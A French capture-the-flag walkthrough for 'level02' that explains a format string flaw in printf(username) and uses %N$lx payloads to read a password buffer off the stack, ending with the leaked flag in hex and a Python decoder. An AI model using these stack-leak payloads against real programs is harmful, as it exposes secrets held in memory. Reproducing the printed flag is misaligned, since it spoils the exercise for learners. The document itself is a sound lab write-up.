# Walkthrough — level02

## 1. Analyse du source

Le binaire fait trois choses :

1. Ouvre `/home/users/level03/.pass` et lit **41 octets** dans le buffer `pass_file` (variable locale sur la stack).
2. Demande un `username` et un `password` via `fgets` (100 octets max, pas d'overflow possible).
3. Compare le password saisi avec `pass_file` via `strncmp` :
   - Si égal → shell.
   - Si différent → **`printf(username)`** puis exit.

La faille est sur le chemin d'échec : `printf(username)` appelle printf avec le username comme **format string** sans format fixe. L'utilisateur contrôle donc le format string → **format string vulnerability**.

---

## 2. Pourquoi c'est exploitable

Sur x86-64, `printf(fmt)` appelé sans arguments supplémentaires va quand même lire des valeurs :
- D'abord dans les registres (rsi, rdx, rcx, r8, r9).
- Ensuite sur la **stack** à partir de l'offset 7.

Le buffer `pass_file` est une variable locale de `main`, donc il est physiquement présent sur la stack. En mettant `%lx` dans le username, on lit les valeurs 64 bits de la stack en hex. En cherchant les bons offsets, on retrouve le contenu de `pass_file`.

---

## 3. Exploitation

### Ce qu'on cherche à faire

Le binaire lit lui-même `/home/users/level03/.pass` dans `pass_file` au démarrage. Ce buffer est stocké sur la stack de `main`. En exploitant le format string, on va **lire la stack depuis le username** pour en extraire le contenu de `pass_file` — c'est-à-dire le flag du niveau suivant, sans jamais connaître le vrai password.

`%N$lx` = affiche la N-ème valeur 64 bits lue depuis la stack en hexadécimal.

---

### Étape 1 — Repérer où commence `password` sur la stack

On met 16 `A` dans le **password**. 'A' = 0x41, donc en mémoire ça donne `4141414141414141`. Le username est le format string, donc c'est lui qui contrôle ce qu'on lit.

```bash
(echo '%1$lx.%2$lx.%3$lx.%4$lx.%5$lx.%6$lx.%7$lx.%8$lx.%9$lx.%10$lx'; echo 'AAAAAAAAAAAAAAAA') | ./level02
```

Sortie obtenue :
```
[val1].[val2].[val3].[val4].[val5].[val6].[val7].4141414141414141.4141414141414141.[val10]
```

`4141414141414141` apparaît aux offsets **8 et 9** (16 A's = 2 slots de 8 octets). Le buffer `password` commence donc à l'offset 8.

---

### Étape 2 — Calculer où est `pass_file`

On connaît la taille des variables dans le source :
```c
char password[112];   // offset 8 — on vient de le confirmer
char pass_file[48];   // juste après en mémoire
```

`password` fait 112 octets → `112 / 8 = 14 slots` → occupe les offsets 8 à 21.

`pass_file` commence donc à l'offset **22**.

---

### Étape 3 — Lire `pass_file`

On lit directement les 5 slots à partir de l'offset 22 :

```bash
(echo '%22$lx.%23$lx.%24$lx.%25$lx.%26$lx'; echo 'wrong') | ./level02
```

Sortie obtenue :
```
756e505234376848.45414a3561733951.377a7143574e6758.354a35686e475873.48336750664b394d
```

5 slots × 8 octets = 40 octets = la taille exacte du flag. Le slot suivant (offset 27) vaut `0` : c'est la fin de la chaîne. On a bien tout `pass_file`.

---

### Étape 3 — Décoder les valeurs hex

Chaque valeur est un entier 64 bits little-endian. Pour retrouver les caractères, on renverse les octets avec `.decode('hex')[::-1]` en Python 2.

```bash
python -c "print ''.join(h.decode('hex')[::-1] for h in ['756e505234376848','45414a3561733951','377a7143574e6758','354a35686e475873','48336750664b394d'])"
```

## 4. Pourquoi `.decode('hex')[::-1]`

`%lx` affiche la valeur entière en hexadécimal, MSB en premier. Mais en mémoire (little-endian), les octets sont stockés LSB en premier. Donc `756e505234376848` en mémoire se lit `48 68 37 34 52 50 6e 75` = `Hh74RPnu`. L'inversion `[::-1]` corrige cet ordre.

---

## 5. Résumé de la faille

| Élément         | Détail                                      |
|----------------|----------------------------------------------|
| Type           | Format String Vulnerability                  |
| Ligne faillible | `printf(username)` sans format fixe          |
| Donnée leakée  | `pass_file` (variable locale de main)        |
| Technique      | `%lx` pour lire la stack en hex              |
| Offsets utiles | 22 à 26 (contiennent les 40 octets du flag)  |
